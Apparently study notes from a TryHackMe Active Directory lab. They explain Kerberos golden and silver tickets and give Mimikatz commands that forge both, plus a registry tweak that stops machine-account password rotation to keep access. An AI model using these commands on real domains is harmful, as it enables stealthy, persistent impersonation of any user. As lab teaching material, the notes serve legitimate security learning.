As discussed in the previous tasks, we often want to persist through service accounts with delegation permissions to forge silver and golden tickets. But what are those exactly, and why does every blue team tabletop exercise end with someone shouting: "Flush all golden and silver tickets!".

**Tickets to the Chocolate Factory**
Before getting into golden and silver tickets, we first just need to do a quick recap on Kerberos authentication. The diagram below shows the normal flow for Kerberos authentication:
![](Pasted%20image%2020241119201536.png)
- The user *makes an AS-REQ to the Key Distribution Centre (KDC)* on the DC that includes *a timestamp encrypted with the user's NTLM hash*. Essentially, this is the request for a ***Ticket Granting Ticket (TGT)***. 
- The *DC checks the information and sends the TGT to the user*. This *TGT is signed with the KRBTGT account's password hash* that is only stored on the DC. The user can now *send this TGT to the DC to request a **Ticket Granting Service (TGS)*** for the resource that the user wants to access.
	- If the ***TGT** checks out, the DC responds to the **TGS** that is encrypted with the NTLM hash of the service* that the user is requesting access for. The user then presents this ***TGS*** to the service for access, which can verify the ***TGS*** since *it knows its own hash and can grant the user access*.

# Golden Tickets
*Golden Tickets are forged **TGTs***. What this means is *we bypass steps 1 and 2* of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a ***TGS*** for almost any service* we want. In order *to forge a golden ticket, we need the KRBTGT account's password hash* so that we can sign a ***TGT*** for any user account we want. 

Some interesting notes about *Golden Tickets*:
- By injecting at this stage of the Kerberos process, we don't need the password hash of the account we want to impersonate since we bypass that step. The ***TGT*** *is only used to prove that the KDC on a DC signed it*. Since it was signed by the *KRBTGT* hash, this verification passes and the TGT is declared valid no matter its contents.
- Speaking of contents, the *KDC will only validate the user account specified in the TGT if it is older than 20 minutes*. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
- Since the *policies and rules for tickets are set in the* ***TGT*** *itself***, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence.
- By default, *the KRBTGT account's password never changes*, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever.
- The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
- Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
- *Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT*.
- We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.

Apart from the *KRBTGT* account's password hash, we need: 
- **the domain name;**
- **domain SID;**
- **user ID for the person we want to impersonate.** 

 If we are in a position where we can recover the *KRBTGT* *account's password hash*, we would already be in a position where we can recover the other pieces of the required information.

# Silver Tickets
*Silver Tickets are forged **TGS** tickets*. So now, *we skip all communication (Step 1-4 in the diagram above*) we would have had with the KDC on the DC and just interface with the service we want access to directly. 

Some interesting notes about *Silver Tickets*:
- *The generated **TGS** is signed by the machine account of the host we are targeting*.  
- The main difference between Golden and Silver Tickets is the number of privileges we acquire. *If we have the KRBTGT account's password hash, we can get access to everything* With a *Silver Ticket*, since we only have access to the password hash of the machine account of the server we are attacking, *we can only impersonate users on that host itself*. *The Silver Ticket's scope is limited to whatever service is targeted on the specific server*.  
- Since the ***TGS*** is forged, there is no associated ***TGT***, meaning *the DC was never contacted*. *This makes the attack incredibly dangerous since the only available logs would be on the targeted server*. So while the scope is more limited, it is significantly harder for the blue team to detect.
- Since *permissions are determined through SIDs*, we can *again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs* that would place the user in the host's local administrators group.  
- The *machine account's password is usually rotated every 30 days*, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
- While only having access to a single host might seem like a significant downgrade, *machine accounts can be used as normal AD accounts*, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

# Recap of Golden/Silver Tickets
- **Golden Ticket**: A fake _TGT (Ticket Granting Ticket)_ used to gain full access to an AD domain. It requires the password hash of the special _KRBTGT_ account.
- **Silver Ticket**: A fake _TGS (Ticket Granting Service ticket)_ used to gain access to specific services on a specific host. It requires the password hash of the target machine's account.

---

### Golden Ticket - The "Master Key"
1. **What it is**:
    - A forged TGT signed with the _KRBTGT_ account’s password hash. This lets you skip proving who you are to the Domain Controller (DC).
2. **Why it’s powerful**:
    - Once you have the _KRBTGT_ hash, you can create TGTs for any user, including non-existent ones.
    - These TGTs can be set to last for years, granting you persistent access to the entire domain.
    - It bypasses most defenses, including smart card authentication.
3. **How it works**:
    - When you use a Golden Ticket, the DC trusts it because it’s signed with the _KRBTGT_ hash, which is like the DC’s "master signature."
    - After forging the TGT, you can request access (via TGS) to any service on the domain.
4. **What you need**:
    - The _KRBTGT_ password hash.
    - The domain name.
    - The domain SID.
    - The user ID of the account to impersonate.

---

### Silver Ticket - The "Service Key"
1. **What it is**:
    - A forged TGS signed with the target machine's account password hash. This lets you skip communicating with the DC entirely.
2. **Why it’s useful**:
    - Gives access to specific services on a single host without needing the _KRBTGT_ hash.
    - Avoids detection because the DC is never contacted; logs are only on the target server.
3. **How it works**:
    - The forged TGS tricks the target service into believing you are an authorized user.
    - You can impersonate existing or fake users by adding the correct SIDs to the ticket.
4. **What you need**:
    - The password hash of the machine account hosting the service you want to attack.

---

### **Differences Between Golden and Silver Tickets**

|Feature|**Golden Ticket**|**Silver Ticket**|
|---|---|---|
|**Target Scope**|Full domain access|Specific service on a single host|
|**Hash Required**|_KRBTGT_ password hash|Target machine account hash|
|**Persistence**|Long-term (TGT valid for years)|Shorter (password rotated in 30 days)|
|**Logs**|Visible on the DC (if detected)|Only on the targeted server|
|**Use Case**|Total domain compromise|Targeted attack on a specific host|

---

### **Workflows: How They Work**

#### Golden Ticket Workflow
1. Extract the _KRBTGT_ password hash from the DC.
2. Forge a ***TGT*** for any user (real or fake).
3. Use the forged TGT to request TGS tickets for services like file shares, databases, or domain controllers.
4. Access domain resources without needing real credentials.

#### Silver Ticket Workflow
1. Extract the *machine account password hash* for the target server.
2. Forge a ***TGS*** for a specific service on the target machine.
3. Directly communicate with the service using the forged TGS.
4. Gain access to the targeted service or escalate privileges locally.


# Forging Tickets
You will need:
- **NTLM hash of the KRBTGT account**: You should already have this from the DC Sync we did earlier.
- **NTLM hash of the THMSERVER1 machine account**: You’ll find this in the dump from the Domain Controller (DC).
- **Domain SID**: Use the AD-RSAT cmdlet on the low-privileged SSH session from THMWRK1 to retrieve this.

```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.ZA> Get-ADDomain


AllowedDNSSuffixes                 : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
**DomainSID**                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
```

Now that we have all the required information, we can relaunch Mimikatz:
```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
```

## Golden Ticket
```markup
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:{Domain SID} /krbtgt:{NTLM hash of KRBTGT account} /endin:600 /renewmax:10080 /ptt
```

- **/admin** - The username we want to impersonate. This does not have to be a valid user.  
- **/domain** - The FQDN of the domain we want to generate the ticket for.  
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/krbtgt** -The NTLM hash of the KRBTGT account.  
- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 
- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can verify that the golden ticket is working by running the dir command against the domain controller:
```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\
```

Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. If we really want to dig in our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. 

## Silver Ticket
```markup
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:{Domain SID} /target:{Hostname of server being targeted} /rc4:{NTLM Hash of machine account of target} /service:cifs /ptt
```

- **/admin** - The username we want to impersonate. This does not have to be a valid user.  
- **/domain** - The FQDN of the domain we want to generate the ticket for.  
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/target** - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.  
- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.  
- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.  
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used

We can verify that the silver ticket is working by running the dir command against THMSERVER1:
```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmserver1.za.tryhackme.loc\c$\
```